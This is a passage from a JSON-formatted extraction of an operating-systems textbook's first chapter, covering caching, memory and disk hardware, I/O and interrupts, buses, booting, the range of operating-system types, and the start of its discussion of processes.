even three levels of cache, each one slower\r\nand bigger than the one before it.\r\nCaching plays a major role in many areas of computer science, not just caching\r\nlines of RAM. Whenever a resource can be divided into pieces, some of which are\r\nused much more heavily than others, caching is often used to improve perfor\u0002mance. Operating systems use it all the time. For example, most operating systems\r\nkeep (pieces of) heavily used files in main memory to avoid having to fetch them\r\nfrom the disk repeatedly. Similarly, the results of converting long path names like\r\n/home/ast/projects/minix3/src/kernel/clock.c\r\ninto the disk address where the file is located can be cached to avoid repeated\r\nlookups. Finally, when the address of a Web page (URL) is converted to a network\r\naddress (IP address), the result can be cached for future use. Many other uses exist.\r\nIn any caching system, several questions come up fairly soon, including:\r\n1. When to put a new item into the cache.\r\n2. Which cache line to put the new item in.\r\n3. Which item to remove from the cache when a slot is needed.\r\n4. Where to put a newly evicted item in the larger memory.\n26 INTRODUCTION CHAP. 1\r\nNot every question is relevant to every caching situation. For caching lines of main\r\nmemory in the CPU cache, a new item will generally be entered on every cache\r\nmiss. The cache line to use is generally computed by using some of the high-order\r\nbits of the memory address referenced. For example, with 4096 cache lines of 64\r\nbytes and 32 bit addresses, bits 6 through 17 might be used to specify the cache\r\nline, with bits 0 to 5 the byte within the cache line. In this case, the item to remove\r\nis the same one as the new data goes into, but in other systems it might not be.\r\nFinally, when a cache line is rewritten to main memory (if it has been modified\r\nsince it was cached), the place in memory to rewrite it to is uniquely determined by\r\nthe address in question.\r\nCaches are such a good idea that modern CPUs have two of them. The first\r\nlevel or L1 cache is always inside the CPU and usually feeds decoded instructions\r\ninto the CPU’s execution engine. Most chips have a second L1 cache for very\r\nheavily used data words. The L1 caches are typically 16 KB each. In addition,\r\nthere is often a second cache, called the L2 cache, that holds several megabytes of\r\nrecently used memory words. The difference between the L1 and L2 caches lies in\r\nthe timing. Access to the L1 cache is done without any delay, whereas access to\r\nthe L2 cache involves a delay of one or two clock cycles.\r\nOn multicore chips, the designers have to decide where to place the caches. In\r\nFig. 1-8(a), a single L2 cache is shared by all the cores. This approach is used in\r\nIntel multicore chips. In contrast, in Fig. 1-8(b), each core has its own L2 cache.\r\nThis approach is used by AMD. Each strategy has its pros and cons. For example,\r\nthe Intel shared L2 cache requires a more complicated cache controller but the\r\nAMD way makes keeping the L2 caches consistent more difficult.\r\nMain memory comes next in the hierarchy of Fig. 1-9. This is the workhorse\r\nof the memory system. Main memory is usually called RAM (Random Access\r\nMemory). Old-timers sometimes call it core memory, because computers in the\r\n1950s and 1960s used tiny magnetizable ferrite cores for main memory. They hav e\r\nbeen gone for decades but the name persists. Currently, memories are hundreds of\r\nmegabytes to several gigabytes and growing rapidly. All CPU requests that cannot\r\nbe satisfied out of the cache go to main memory.\r\nIn addition to the main memory, many computers have a small amount of non\u0002volatile random-access memory. Unlike RAM, nonvolatile memory does not lose\r\nits contents when the power is switched off. ROM (Read Only Memory) is pro\u0002grammed at the factory and cannot be changed afterward. It is fast and inexpen\u0002sive. On some computers, the bootstrap loader used to start the computer is con\u0002tained in ROM. Also, some I/O cards come with ROM for handling low-level de\u0002vice control.\r\nEEPROM (Electrically Erasable PROM) and flash memory are also non\u0002volatile, but in contrast to ROM can be erased and rewritten. However, writing\r\nthem takes orders of magnitude more time than writing RAM, so they are used in\r\nthe same way ROM is, only with the additional feature that it is now possible to\r\ncorrect bugs in programs they hold by rewriting them in the field.\nSEC. 1.3 COMPUTER HARDWARE REVIEW 27\r\nFlash memory is also commonly used as the storage medium in portable elec\u0002tronic devices. It serves as film in digital cameras and as the disk in portable music\r\nplayers, to name just two uses. Flash memory is intermediate in speed between\r\nRAM and disk. Also, unlike disk memory, if it is erased too many times, it wears\r\nout.\r\nYet another kind of memory is CMOS, which is volatile. Many computers use\r\nCMOS memory to hold the current time and date. The CMOS memory and the\r\nclock circuit that increments the time in it are powered by a small battery, so the\r\ntime is correctly updated, even when the computer is unplugged. The CMOS mem\u0002ory can also hold the configuration parameters, such as which disk to boot from.\r\nCMOS is used because it draws so little power that the original factory-installed\r\nbattery often lasts for several years. However, when it begins to fail, the computer\r\ncan appear to have Alzheimer’s disease, forgetting things that it has known for\r\nyears, like which hard disk to boot from."
          },
          "1.3.3 Disks": {
            "page": 58,
            "content": "1.3.3 Disks\r\nNext in the hierarchy is magnetic disk (hard disk). Disk storage is two orders\r\nof magnitude cheaper than RAM per bit and often two orders of magnitude larger\r\nas well. The only problem is that the time to randomly access data on it is close to\r\nthree orders of magnitude slower. The reason is that a disk is a mechanical device,\r\nas shown in Fig. 1-10.\r\nSurface 2\r\nSurface 1\r\nSurface 0\r\nRead/write head (1 per surface)\r\nDirection of arm motion \r\nSurface 3\r\nSurface 5\r\nSurface 4\r\nSurface 7\r\nSurface 6\r\nFigure 1-10. Structure of a disk drive.\r\nA disk consists of one or more metal platters that rotate at 5400, 7200, 10,800\r\nRPM or more. A mechanical arm pivots over the platters from the corner, similar\r\nto the pickup arm on an old 33-RPM phonograph for playing vinyl records.\n28 INTRODUCTION CHAP. 1\r\nInformation is written onto the disk in a series of concentric circles. At any giv en\r\narm position, each of the heads can read an annular region called a track. Toget\u0002her, all the tracks for a given arm position form a cylinder.\r\nEach track is divided into some number of sectors, typically 512 bytes per sec\u0002tor. On modern disks, the outer cylinders contain more sectors than the inner ones.\r\nMoving the arm from one cylinder to the next takes about 1 msec. Moving it to a\r\nrandom cylinder typically takes 5 to 10 msec, depending on the drive. Once the\r\narm is on the correct track, the drive must wait for the needed sector to rotate under\r\nthe head, an additional delay of 5 msec to 10 msec, depending on the drive’s RPM.\r\nOnce the sector is under the head, reading or writing occurs at a rate of 50 MB/sec\r\non low-end disks to 160 MB/sec on faster ones.\r\nSometimes you will hear people talk about disks that are really not disks at all,\r\nlike SSDs, (Solid State Disks). SSDs do not have moving parts, do not contain\r\nplatters in the shape of disks, and store data in (Flash) memory. The only ways in\r\nwhich they resemble disks is that they also store a lot of data which is not lost\r\nwhen the power is off.\r\nMany computers support a scheme known as virtual memory, which we will\r\ndiscuss at some length in Chap. 3. This scheme makes it possible to run programs\r\nlarger than physical memory by placing them on the disk and using main memory\r\nas a kind of cache for the most heavily executed parts. This scheme requires re\u0002mapping memory addresses on the fly to convert the address the program gener\u0002ated to the physical address in RAM where the word is located. This mapping is\r\ndone by a part of the CPU called the MMU (Memory Management Unit), as\r\nshown in Fig. 1-6.\r\nThe presence of caching and the MMU can have a major impact on per\u0002formance. In a multiprogramming system, when switching from one program to\r\nanother, sometimes called a context switch, it may be necessary to flush all modi\u0002fied blocks from the cache and change the mapping registers in the MMU. Both of\r\nthese are expensive operations, and programmers try hard to avoid them. We will\r\nsee some of the implications of their tactics later."
          },
          "1.3.4 I/O Devices": {
            "page": 59,
            "content": "1.3.4 I/O Devices\r\nThe CPU and memory are not the only resources that the operating system\r\nmust manage. I/O devices also interact heavily with the operating system. As we\r\nsaw in Fig. 1-6, I/O devices generally consist of two parts: a controller and the de\u0002vice itself. The controller is a chip or a set of chips that physically controls the de\u0002vice. It accepts commands from the operating system, for example, to read data\r\nfrom the device, and carries them out.\r\nIn many cases, the actual control of the device is complicated and detailed, so\r\nit is the job of the controller to present a simpler (but still very complex) interface\r\nto the operating system. For example, a disk controller might accept a command to\nSEC. 1.3 COMPUTER HARDWARE REVIEW 29\r\nread sector 11,206 from disk 2. The controller then has to convert this linear sector\r\nnumber to a cylinder, sector, and head. This conversion may be complicated by the\r\nfact that outer cylinders have more sectors than inner ones and that some bad sec\u0002tors have been remapped onto other ones. Then the controller has to determine\r\nwhich cylinder the disk arm is on and give it a command to move in or out the req\u0002uisite number of cylinders. It has to wait until the proper sector has rotated under\r\nthe head and then start reading and storing the bits as they come off the drive,\r\nremoving the preamble and computing the checksum. Finally, it has to assemble\r\nthe incoming bits into words and store them in memory. To do all this work, con\u0002trollers often contain small embedded computers that are programmed to do their\r\nwork.\r\nThe other piece is the actual device itself. Devices have fairly simple inter\u0002faces, both because they cannot do much and to make them standard. The latter is\r\nneeded so that any SAT A disk controller can handle any SAT A disk, for example.\r\nSATA stands for Serial ATA and AT A in turn stands for AT Attachment. In case\r\nyou are curious what AT stands for, this was IBM’s second generation ‘‘Personal\r\nComputer Advanced Technology’’ built around the then-extremely-potent 6-MHz\r\n80286 processor that the company introduced in 1984. What we learn from this is\r\nthat the computer industry has a habit of continuously enhancing existing acro\u0002nyms with new prefixes and suffixes. We also learned that an adjective like ‘‘ad\u0002vanced’’ should be used with great care, or you will look silly thirty years down the\r\nline.\r\nSATA is currently the standard type of disk on many computers. Since the ac\u0002tual device interface is hidden behind the controller, all that the operating system\r\nsees is the interface to the controller, which may be quite different from the inter\u0002face to the device.\r\nBecause each type of controller is different, different software is needed to\r\ncontrol each one. The software that talks to a controller, giving it commands and\r\naccepting responses, is called a device driver. Each controller manufacturer has to\r\nsupply a driver for each operating system it supports. Thus a scanner may come\r\nwith drivers for OS X, Windows 7, Windows 8, and Linux, for example.\r\nTo be used, the driver has to be put into the operating system so it can run in\r\nkernel mode. Drivers can actually run outside the kernel, and operating systems\r\nlike Linux and Windows nowadays do offer some support for doing so. The vast\r\nmajority of the drivers still run below the kernel boundary. Only very few current\r\nsystems, such as MINIX 3, run all drivers in user space. Drivers in user space must\r\nbe allowed to access the device in a controlled way, which is not straightforward.\r\nThere are three ways the driver can be put into the kernel. The first way is to\r\nrelink the kernel with the new driver and then reboot the system. Many older UNIX\r\nsystems work like this. The second way is to make an entry in an operating system\r\nfile telling it that it needs the driver and then reboot the system. At boot time, the\r\noperating system goes and finds the drivers it needs and loads them. Windows\r\nworks this way. The third way is for the operating system to be able to accept new\n30 INTRODUCTION CHAP. 1\r\ndrivers while running and install them on the fly without the need to reboot. This\r\nway used to be rare but is becoming much more common now. Hot-pluggable\r\ndevices, such as USB and IEEE 1394 devices (discussed below), always need dy\u0002namically loaded drivers.\r\nEvery controller has a small number of registers that are used to communicate\r\nwith it. For example, a minimal disk controller might have registers for specifying\r\nthe disk address, memory address, sector count, and direction (read or write). To\r\nactivate the controller, the driver gets a command from the operating system, then\r\ntranslates it into the appropriate values to write into the device registers. The col\u0002lection of all the device registers forms the I/O port space, a subject we will come\r\nback to in Chap. 5.\r\nOn some computers, the device registers are mapped into the operating sys\u0002tem’s address space (the addresses it can use), so they can be read and written like\r\nordinary memory words. On such computers, no special I/O instructions are re\u0002quired and user programs can be kept away from the hardware by not putting these\r\nmemory addresses within their reach (e.g., by using base and limit registers). On\r\nother computers, the device registers are put in a special I/O port space, with each\r\nregister having a port address. On these machines, special IN and OUT instructions\r\nare available in kernel mode to allow drivers to read and write the registers. The\r\nformer scheme eliminates the need for special I/O instructions but uses up some of\r\nthe address space. The latter uses no address space but requires special instruc\u0002tions. Both systems are widely used.\r\nInput and output can be done in three different ways. In the simplest method, a\r\nuser program issues a system call, which the kernel then translates into a procedure\r\ncall to the appropriate driver. The driver then starts the I/O and sits in a tight loop\r\ncontinuously polling the device to see if it is done (usually there is some bit that in\u0002dicates that the device is still busy). When the I/O has completed, the driver puts\r\nthe data (if any) where they are needed and returns. The operating system then re\u0002turns control to the caller. This method is called busy waiting and has the disad\u0002vantage of tying up the CPU polling the device until it is finished.\r\nThe second method is for the driver to start the device and ask it to give an in\u0002terrupt when it is finished. At that point the driver returns. The operating system\r\nthen blocks the caller if need be and looks for other work to do. When the con\u0002troller detects the end of the transfer, it generates an interrupt to signal comple\u0002tion.\r\nInterrupts are very important in operating systems, so let us examine the idea\r\nmore closely. In Fig. 1-11(a) we see a three-step process for I/O. In step 1, the\r\ndriver tells the controller what to do by writing into its device registers. The con\u0002troller then starts the device. When the controller has finished reading or writing\r\nthe number of bytes it has been told to transfer, it signals the interrupt controller\r\nchip using certain bus lines in step 2. If the interrupt controller is ready to accept\r\nthe interrupt (which it may not be if it is busy handling a higher-priority one), it as\u0002serts a pin on the CPU chip telling it, in step 3. In step 4, the interrupt controller\nSEC. 1.3 COMPUTER HARDWARE REVIEW 31\r\nputs the number of the device on the bus so the CPU can read it and know which\r\ndevice has just finished (many devices may be running at the same time).\r\nCPU Interrupt\r\ncontroller\r\nDisk\r\ncontroller\r\nDisk drive\r\nCurrent instruction\r\nNext instruction\r\n1. Interrupt\r\n3. Return\r\n2. Dispatch \r\nto handler\r\nInterrupt handler\r\n(a) (b)\r\n1\r\n3\r\n4 2\r\nFigure 1-11. (a) The steps in starting an I/O device and getting an interrupt. (b)\r\nInterrupt processing involves taking the interrupt, running the interrupt handler,\r\nand returning to the user program.\r\nOnce the CPU has decided to take the interrupt, the program counter and PSW\r\nare typically then pushed onto the current stack and the CPU switched into kernel\r\nmode. The device number may be used as an index into part of memory to find the\r\naddress of the interrupt handler for this device. This part of memory is called the\r\ninterrupt vector. Once the interrupt handler (part of the driver for the interrupting\r\ndevice) has started, it removes the stacked program counter and PSW and saves\r\nthem, then queries the device to learn its status. When the handler is all finished, it\r\nreturns to the previously running user program to the first instruction that was not\r\nyet executed. These steps are shown in Fig. 1-11(b).\r\nThe third method for doing I/O makes use of special hardware: a DMA\r\n(Direct Memory Access) chip that can control the flow of bits between memory\r\nand some controller without constant CPU intervention. The CPU sets up the\r\nDMA chip, telling it how many bytes to transfer, the device and memory addresses\r\ninvolved, and the direction, and lets it go. When the DMA chip is done, it causes\r\nan interrupt, which is handled as described above. DMA and I/O hardware in gen\u0002eral will be discussed in more detail in Chap. 5.\r\nInterrupts can (and often do) happen at highly inconvenient moments, for ex\u0002ample, while another interrupt handler is running. For this reason, the CPU has a\r\nway to disable interrupts and then reenable them later. While interrupts are dis\u0002abled, any devices that finish continue to assert their interrupt signals, but the CPU\r\nis not interrupted until interrupts are enabled again. If multiple devices finish\r\nwhile interrupts are disabled, the interrupt controller decides which one to let\r\nthrough first, usually based on static priorities assigned to each device. The\r\nhighest-priority device wins and gets to be serviced first. The others must wait.\n32 INTRODUCTION CHAP. 1"
          },
          "1.3.5 Buses": {
            "page": 63,
            "content": "1.3.5 Buses\r\nThe organization of Fig. 1-6 was used on minicomputers for years and also on\r\nthe original IBM PC. However, as processors and memories got faster, the ability\r\nof a single bus (and certainly the IBM PC bus) to handle all the traffic was strained\r\nto the breaking point. Something had to give. As a result, additional buses were\r\nadded, both for faster I/O devices and for CPU-to-memory traffic. As a conse\u0002quence of this evolution, a large x86 system currently looks something like\r\nFig. 1-12.\r\nMemory controllers DDR3 Memory\r\nGraphics PCIe\r\nPlatform\r\nController\r\nHub\r\nDMI\r\nPCIe slot\r\nPCIe slot\r\nPCIe slot\r\nPCIe slot\r\nCore1 Core2\r\nShared cache\r\nGPU Cores\r\nDDR3 Memory\r\nSATA\r\nUSB 2.0 ports\r\nUSB 3.0 ports\r\nGigabit Ethernet\r\nCache Cache\r\nMore PCIe devices\r\nPCIe\r\nFigure 1-12. The structure of a large x86 system.\r\nThis system has many buses (e.g., cache, memory, PCIe, PCI, USB, SATA, and\r\nDMI), each with a different transfer rate and function. The operating system must\r\nbe aware of all of them for configuration and management. The main bus is the\r\nPCIe (Peripheral Component Interconnect Express) bus.\r\nThe PCIe bus was invented by Intel as a successor to the older PCI bus, which\r\nin turn was a replacement for the original ISA (Industry Standard Architecture)\r\nbus. Capable of transferring tens of gigabits per second, PCIe is much faster than\r\nits predecessors. It is also very different in nature. Up to its creation in 2004, most\r\nbuses were parallel and shared. A shared bus architecture means that multiple de\u0002vices use the same wires to transfer data. Thus, when multiple devices have data to\r\nsend, you need an arbiter to determine who can use the bus. In contrast, PCIe\r\nmakes use of dedicated, point-to-point connections. A parallel bus architecture as\r\nused in traditional PCI means that you send each word of data over multiple wires.\r\nFor instance, in regular PCI buses, a single 32-bit number is sent over 32 parallel\r\nwires. In contrast to this, PCIe uses a serial bus architecture and sends all bits in\nSEC. 1.3 COMPUTER HARDWARE REVIEW 33\r\na message through a single connection, known as a lane, much like a network\r\npacket. This is much simpler, because you do not have to ensure that all 32 bits\r\narrive at the destination at exactly the same time. Parallelism is still used, because\r\nyou can have multiple lanes in parallel. For instance, we may use 32 lanes to carry\r\n32 messages in parallel. As the speed of peripheral devices like network cards and\r\ngraphics adapters increases rapidly, the PCIe standard is upgraded every 3–5 years.\r\nFor instance, 16 lanes of PCIe 2.0 offer 64 gigabits per second. Upgrading to PCIe\r\n3.0 will give you twice that speed and PCIe 4.0 will double that again.\r\nMeanwhile, we still have many leg acy devices for the older PCI standard. As\r\nwe see in Fig. 1-12, these devices are hooked up to a separate hub processor. In\r\nthe future, when we consider PCI no longer merely old, but ancient, it is possible\r\nthat all PCI devices will attach to yet another hub that in turn connects them to the\r\nmain hub, creating a tree of buses.\r\nIn this configuration, the CPU talks to memory over a fast DDR3 bus, to an ex\u0002ternal graphics device over PCIe and to all other devices via a hub over a DMI\r\n(Direct Media Interface) bus. The hub in turn connects all the other devices,\r\nusing the Universal Serial Bus to talk to USB devices, the SATA bus to interact\r\nwith hard disks and DVD drives, and PCIe to transfer Ethernet frames. We hav e al\u0002ready mentioned the older PCI devices that use a traditional PCI bus.\r\nMoreover, each of the cores has a dedicated cache and a much larger cache that\r\nis shared between them. Each of these caches introduces another bus.\r\nThe USB (Universal Serial Bus) was invented to attach all the slow I/O de\u0002vices, such as the keyboard and mouse, to the computer. Howev er, calling a mod\u0002ern USB 3.0 device humming along at 5 Gbps ‘‘slow’’ may not come naturally for\r\nthe generation that grew up with 8-Mbps ISA as the main bus in the first IBM PCs.\r\nUSB uses a small connector with four to eleven wires (depending on the version),\r\nsome of which supply electrical power to the USB devices or connect to ground.\r\nUSB is a centralized bus in which a root device polls all the I/O devices every 1\r\nmsec to see if they hav e any traffic. USB 1.0 could handle an aggregate load of 12\r\nMbps, USB 2.0 increased the speed to 480 Mbps, and USB 3.0 tops at no less than\r\n5 Gbps. Any USB device can be connected to a computer and it will function im\u0002mediately, without requiring a reboot, something pre-USB devices required, much\r\nto the consternation of a generation of frustrated users.\r\nThe SCSI (Small Computer System Interface) bus is a high-performance bus\r\nintended for fast disks, scanners, and other devices needing considerable band\u0002width. Nowadays, we find them mostly in servers and workstations. They can run\r\nat up to 640 MB/sec.\r\nTo work in an environment such as that of Fig. 1-12, the operating system has\r\nto know what peripheral devices are connected to the computer and configure\r\nthem. This requirement led Intel and Microsoft to design a PC system called plug\r\nand play, based on a similar concept first implemented in the Apple Macintosh.\r\nBefore plug and play, each I/O card had a fixed interrupt request level and fixed ad\u0002dresses for its I/O registers. For example, the keyboard was interrupt 1 and used\n34 INTRODUCTION CHAP. 1\r\nI/O addresses 0x60 to 0x64, the floppy disk controller was interrupt 6 and used I/O\r\naddresses 0x3F0 to 0x3F7, and the printer was interrupt 7 and used I/O addresses\r\n0x378 to 0x37A, and so on.\r\nSo far, so good. The trouble came in when the user bought a sound card and a\r\nmodem card and both happened to use, say, interrupt 4. They would conflict and\r\nwould not work together. The solution was to include DIP switches or jumpers on\r\nev ery I/O card and instruct the user to please set them to select an interrupt level\r\nand I/O device addresses that did not conflict with any others in the user’s system.\r\nTeenagers who devoted their lives to the intricacies of the PC hardware could\r\nsometimes do this without making errors. Unfortunately, nobody else could, lead\u0002ing to chaos.\r\nWhat plug and play does is have the system automatically collect information\r\nabout the I/O devices, centrally assign interrupt levels and I/O addresses, and then\r\ntell each card what its numbers are. This work is closely related to booting the\r\ncomputer, so let us look at that. It is not completely trivial."
          },
          "1.3.6 Booting the Computer": {
            "page": 65,
            "content": "1.3.6 Booting the Computer\r\nVery briefly, the boot process is as follows. Every PC contains a parentboard\r\n(formerly called a motherboard before political correctness hit the computer indus\u0002try). On the parentboard is a program called the system BIOS (Basic Input Out\u0002put System). The BIOS contains low-level I/O software, including procedures to\r\nread the keyboard, write to the screen, and do disk I/O, among other things. Now\u0002adays, it is held in a flash RAM, which is nonvolatile but which can be updated by\r\nthe operating system when bugs are found in the BIOS.\r\nWhen the computer is booted, the BIOS is started. It first checks to see how\r\nmuch RAM is installed and whether the keyboard and other basic devices are in\u0002stalled and responding correctly. It starts out by scanning the PCIe and PCI buses\r\nto detect all the devices attached to them. If the devices present are different from\r\nwhen the system was last booted, the new devices are configured.\r\nThe BIOS then determines the boot device by trying a list of devices stored in\r\nthe CMOS memory. The user can change this list by entering a BIOS configuration\r\nprogram just after booting. Typically, an attempt is made to boot from a CD-ROM\r\n(or sometimes USB) drive, if one is present. If that fails, the system boots from the\r\nhard disk. The first sector from the boot device is read into memory and executed.\r\nThis sector contains a program that normally examines the partition table at the\r\nend of the boot sector to determine which partition is active. Then a secondary boot\r\nloader is read in from that partition. This loader reads in the operating system\r\nfrom the active partition and starts it.\r\nThe operating system then queries the BIOS to get the configuration infor\u0002mation. For each device, it checks to see if it has the device driver. If not, it asks\r\nthe user to insert a CD-ROM containing the driver (supplied by the device’s manu\u0002facturer) or to download it from the Internet. Once it has all the device drivers, the\nSEC. 1.3 COMPUTER HARDWARE REVIEW 35\r\noperating system loads them into the kernel. Then it initializes its tables, creates\r\nwhatever background processes are needed, and starts up a login program or GUI."
          }
        }
      },
      "1.4 THE OPERATING SYSTEM ZOO": {
        "page": 66,
        "children": {
          "1.4.1 Mainframe Operating Systems": {
            "page": 66,
            "content": "1.4.1 Mainframe Operating Systems\r\nAt the high end are the operating systems for mainframes, those room-sized\r\ncomputers still found in major corporate data centers. These computers differ from\r\npersonal computers in terms of their I/O capacity. A mainframe with 1000 disks\r\nand millions of gigabytes of data is not unusual; a personal computer with these\r\nspecifications would be the envy of its friends. Mainframes are also making some\u0002thing of a comeback as high-end Web servers, servers for large-scale electronic\r\ncommerce sites, and servers for business-to-business transactions.\r\nThe operating systems for mainframes are heavily oriented toward processing\r\nmany jobs at once, most of which need prodigious amounts of I/O. They typically\r\noffer three kinds of services: batch, transaction processing, and timesharing. A\r\nbatch system is one that processes routine jobs without any interactive user present.\r\nClaims processing in an insurance company or sales reporting for a chain of stores\r\nis typically done in batch mode. Transaction-processing systems handle large num\u0002bers of small requests, for example, check processing at a bank or airline reserva\u0002tions. Each unit of work is small, but the system must handle hundreds or thou\u0002sands per second. Timesharing systems allow multiple remote users to run jobs on\r\nthe computer at once, such as querying a big database. These functions are closely\r\nrelated; mainframe operating systems often perform all of them. An example\r\nmainframe operating system is OS/390, a descendant of OS/360. However, main\u0002frame operating systems are gradually being replaced by UNIX variants such as\r\nLinux."
          },
          "1.4.2 Server Operating Systems": {
            "page": 66,
            "content": "1.4.2 Server Operating Systems\r\nOne level down are the server operating systems. They run on servers, which\r\nare either very large personal computers, workstations, or even mainframes. They\r\nserve multiple users at once over a network and allow the users to share hardware\r\nand software resources. Servers can provide print service, file service, or Web\n36 INTRODUCTION CHAP. 1\r\nservice. Internet providers run many server machines to support their customers\r\nand Websites use servers to store the Web pages and handle the incoming requests.\r\nTypical server operating systems are Solaris, FreeBSD, Linux and Windows Server\r\n201x."
          },
          "1.4.3 Multiprocessor Operating Systems": {
            "page": 67,
            "content": "1.4.3 Multiprocessor Operating Systems\r\nAn increasingly common way to get major-league computing power is to con\u0002nect multiple CPUs into a single system. Depending on precisely how they are\r\nconnected and what is shared, these systems are called parallel computers, multi\u0002computers, or multiprocessors. They need special operating systems, but often\r\nthese are variations on the server operating systems, with special features for com\u0002munication, connectivity, and consistency.\r\nWith the recent advent of multicore chips for personal computers, even\r\nconventional desktop and notebook operating systems are starting to deal with at\r\nleast small-scale multiprocessors and the number of cores is likely to grow over\r\ntime. Luckily, quite a bit is known about multiprocessor operating systems from\r\nyears of previous research, so using this knowledge in multicore systems should\r\nnot be hard. The hard part will be having applications make use of all this comput\u0002ing power. Many popular operating systems, including Windows and Linux, run\r\non multiprocessors."
          },
          "1.4.4 Personal Computer Operating Systems": {
            "page": 67,
            "content": "1.4.4 Personal Computer Operating Systems\r\nThe next category is the personal computer operating system. Modern ones all\r\nsupport multiprogramming, often with dozens of programs started up at boot time.\r\nTheir job is to provide good support to a single user. They are widely used for\r\nword processing, spreadsheets, games, and Internet access. Common examples are\r\nLinux, FreeBSD, Windows 7, Windows 8, and Apple’s OS X. Personal computer\r\noperating systems are so widely known that probably little introduction is needed.\r\nIn fact, many people are not even aware that other kinds exist."
          },
          "1.4.5 Handheld Computer Operating Systems": {
            "page": 67,
            "content": "1.4.5 Handheld Computer Operating Systems\r\nContinuing on down to smaller and smaller systems, we come to tablets,\r\nsmartphones and other handheld computers. A handheld computer, originally\r\nknown as a PDA (Personal Digital Assistant), is a small computer that can be\r\nheld in your hand during operation. Smartphones and tablets are the best-known\r\nexamples. As we have already seen, this market is currently dominated by\r\nGoogle’s Android and Apple’s iOS, but they hav e many competitors. Most of these\r\ndevices boast multicore CPUs, GPS, cameras and other sensors, copious amounts\r\nof memory, and sophisticated operating systems. Moreover, all of them have more\r\nthird-party applications (‘‘apps’’) than you can shake a (USB) stick at.\nSEC. 1.4 THE OPERATING SYSTEM ZOO 37"
          },
          "1.4.6 Embedded Operating Systems": {
            "page": 68,
            "content": "1.4.6 Embedded Operating Systems\r\nEmbedded systems run on the computers that control devices that are not gen\u0002erally thought of as computers and which do not accept user-installed software.\r\nTypical examples are microwave ovens, TV sets, cars, DVD recorders, traditional\r\nphones, and MP3 players. The main property which distinguishes embedded sys\u0002tems from handhelds is the certainty that no untrusted software will ever run on it.\r\nYou cannot download new applications to your microwave oven—all the software\r\nis in ROM. This means that there is no need for protection between applications,\r\nleading to design simplification. Systems such as Embedded Linux, QNX and\r\nVxWorks are popular in this domain."
          },
          "1.4.7 Sensor-Node Operating Systems": {
            "page": 68,
            "content": "1.4.7 Sensor-Node Operating Systems\r\nNetworks of tiny sensor nodes are being deployed for numerous purposes.\r\nThese nodes are tiny computers that communicate with each other and with a base\r\nstation using wireless communication. Sensor networks are used to protect the\r\nperimeters of buildings, guard national borders, detect fires in forests, measure\r\ntemperature and precipitation for weather forecasting, glean information about\r\nenemy movements on battlefields, and much more.\r\nThe sensors are small battery-powered computers with built-in radios. They\r\nhave limited power and must work for long periods of time unattended outdoors,\r\nfrequently in environmentally harsh conditions. The network must be robust\r\nenough to tolerate failures of individual nodes, which happen with ever-increasing\r\nfrequency as the batteries begin to run down.\r\nEach sensor node is a real computer, with a CPU, RAM, ROM, and one or\r\nmore environmental sensors. It runs a small, but real operating system, usually one\r\nthat is event driven, responding to external events or making measurements period\u0002ically based on an internal clock. The operating system has to be small and simple\r\nbecause the nodes have little RAM and battery lifetime is a major issue. Also, as\r\nwith embedded systems, all the programs are loaded in advance; users do not sud\u0002denly start programs they downloaded from the Internet, which makes the design\r\nmuch simpler. TinyOS is a well-known operating system for a sensor node."
          },
          "1.4.8 Real-Time Operating Systems": {
            "page": 68,
            "content": "1.4.8 Real-Time Operating Systems\r\nAnother type of operating system is the real-time system. These systems are\r\ncharacterized by having time as a key parameter. For example, in industrial proc\u0002ess-control systems, real-time computers have to collect data about the production\r\nprocess and use it to control machines in the factory. Often there are hard deadlines\r\nthat must be met. For example, if a car is moving down an assembly line, certain\r\nactions must take place at certain instants of time. If, for example, a welding robot\r\nwelds too early or too late, the car will be ruined. If the action absolutely must\n38 INTRODUCTION CHAP. 1\r\noccur at a certain moment (or within a certain range), we have a hard real-time\r\nsystem. Many of these are found in industrial process control, avionics, military,\r\nand similar application areas. These systems must provide absolute guarantees that\r\na certain action will occur by a certain time.\r\nA soft real-time system, is one where missing an occasional deadline, while\r\nnot desirable, is acceptable and does not cause any permanent damage. Digital\r\naudio or multimedia systems fall in this category. Smartphones are also soft real\u0002time systems.\r\nSince meeting deadlines is crucial in (hard) real-time systems, sometimes the\r\noperating system is simply a library linked in with the application programs, with\r\nev erything tightly coupled and no protection between parts of the system. An ex\u0002ample of this type of real-time system is eCos.\r\nThe categories of handhelds, embedded systems, and real-time systems overlap\r\nconsiderably. Nearly all of them have at least some soft real-time aspects. The em\u0002bedded and real-time systems run only software put in by the system designers;\r\nusers cannot add their own software, which makes protection easier. The handhelds\r\nand embedded systems are intended for consumers, whereas real-time systems are\r\nmore for industrial usage. Nevertheless, they hav e a certain amount in common."
          },
          "1.4.9 Smart Card Operating Systems": {
            "page": 69,
            "content": "1.4.9 Smart Card Operating Systems\r\nThe smallest operating systems run on smart cards, which are credit-card-sized\r\ndevices containing a CPU chip. They hav e very severe processing power and mem\u0002ory constraints. Some are powered by contacts in the reader into which they are\r\ninserted, but contactless smart cards are inductively powered, which greatly limits\r\nwhat they can do. Some of them can handle only a single function, such as elec\u0002tronic payments, but others can handle multiple functions. Often these are propri\u0002etary systems.\r\nSome smart cards are Java oriented. This means that the ROM on the smart\r\ncard holds an interpreter for the Java Virtual Machine (JVM). Java applets (small\r\nprograms) are downloaded to the card and are interpreted by the JVM interpreter.\r\nSome of these cards can handle multiple Java applets at the same time, leading to\r\nmultiprogramming and the need to schedule them. Resource management and pro\u0002tection also become an issue when two or more applets are present at the same\r\ntime. These issues must be handled by the (usually extremely primitive) operating\r\nsystem present on the card."
          }
        }
      },
      "1.5 OPERATING SYSTEM CONCEPTS": {
        "page": 69,
        "children": {
          "1.5.1 Processes": {
            "page": 70,
            "content": "1.5.1 Processes\r\nA key concept in all operating systems is the process. A process is basically a\r\nprogram in execution. Associated with each process is its address space, a list of\r\nmemory locations from 0 to some maximum, which the process can read and write.\r\nThe address space contains the executable program, the program’s data, and its\r\nstack. Also associated with each process is a set of resources, commonly including\r\nregisters (including the program counter and stack pointer), a list of open files, out\u0002standing alarms, lists of related processes, and all the other information needed to\r\nrun the program. A process is fundamentally a container that holds all the infor\u0002mation needed to run a program.\r\nWe will come back to the process concept in much more detail in Chap. 2. For\r\nthe time being, the easiest way to get a good intuitive feel for a process is to think\r\nabout a multiprogramming system. The user may have started a video editing pro\u0002gram and instructed it to convert a one-hour video to a certain format (something\r\nthat can take hours) and then gone off to surf the Web. Meanwhile, a background\r\nprocess that wakes up periodically to check for incoming email may have started\r\nrunning. Thus we have (at least) three active processes: the video editor, the Web\r\nbrowser, and the email receiver. Periodically, the operating 